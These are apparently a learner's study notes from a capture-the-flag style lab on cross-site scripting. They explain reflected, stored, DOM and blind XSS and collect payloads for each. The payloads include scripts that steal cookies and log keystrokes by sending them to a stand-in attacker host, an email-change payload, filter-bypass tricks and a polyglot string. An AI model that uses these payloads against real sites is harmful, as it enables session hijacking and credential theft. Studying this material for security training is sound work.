Cross-site Scripting aka XSS 

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. 

------------

What is a payload?

In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. 

there are two types of payload :- 

1. intention - what you wish the javascript to actually do for us 

2. modification - changes to the code we need to make it execute as every scenario is different 

-------------

Proof Of Concept:

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:



<script>alert('XSS');</script>

-----------

Session Stealing:

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.



<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>


-------------

Key Logger:

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.



<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

--------------

Business Logic:

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:



<script>user.changeEmail('attacker@hacker.thm');</script>



Now that the email address for the account has changed, the attacker may perform a reset password attack.

-----------

Reflected XSS 

happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

How to test for Reflected XSS:

You'll need to test every possible point of entry; these include:

1. Parameters in the URL Query String
2. URL File Path
3. Sometimes HTTP Headers (although unlikely exploitable in practice)

----------

Stored XSS

As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

How to test for Stored XSS:

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

1. Comments on a blog
2. User profile information
3. Website Listings

--------------

What is the DOM?

DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.


--------------

Blind XSS 

is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is xsshunter

-------------

so there are different levels which requires us to bypass different filters and different type of tags and here it goes :- 

1. simple one with no protection at all 

<script>alert('THM');</script>



2. here we are inside an input tag which need to be escaped in order for us to perform a successful xss here so:- 

"><script>alert('THM');</script>

we used this payload because :-

The important part of the payload is the (">) which closes the value parameter and then closes the input tag.



3. when our data is being stored in an HTML tag i.e textarea tag in this case so we used this payload :-

</textarea><script>alert('THM');</script>

The important part of the above payload is </textarea>, which causes the textarea element to close so the script will run.



4. sometimes we will have to escape javascript code/command used in the webpage or page source in order to create a perfect payload for xss.

our payload will look something like :- 

';alert('THM');//

(') this closes the field 

(;) this end the previous command being used 

(//) and this will make everything a commend afterwards our xss payload .


5. so here is a filter that filters the word "script" out from our payload.

When a word gets removed from a string, there's a helpful trick that you can try. i.e :- 

Original Payload:
<sscriptcript>alert('THM');</sscriptcript>

Text to be removed (by the filter):
<sscriptcript>alert('THM');</sscriptcript> # here the word script between s and cript gets filtered and a perfect payload is left in final step i.e :- 

Final Payload (after passing the filter):
<script>alert('THM');</script>



6. in this case the (< , >) these things like greater and smaller than sign gets removed which is preventing us from escaping img tag 

we can take advantage of the additional attributes of the IMG tag, such as the onload event. 

The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.

our payload will look something like this :- 

 /images/cat.jpg" onload="alert('THM');  



7. Polygots - An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
                     


--------------

Blind XSS 

</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>



Let's breakdown the payload: (Cookie Stealer)

The </textarea> tag closes the textarea field. 

The <script>tag opens open an area for us to write JavaScript.

The fetch() command makes an HTTP request.

{URL_OR_IP} is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.

?cookie= is the query string that will contain the victim's cookies.                                               

btoa() command base64 encodes the victim's cookies.                                                    

document.cookie accesses the victim's cookies for the Acme IT Support Website.

</script>closes the JavaScript code block.










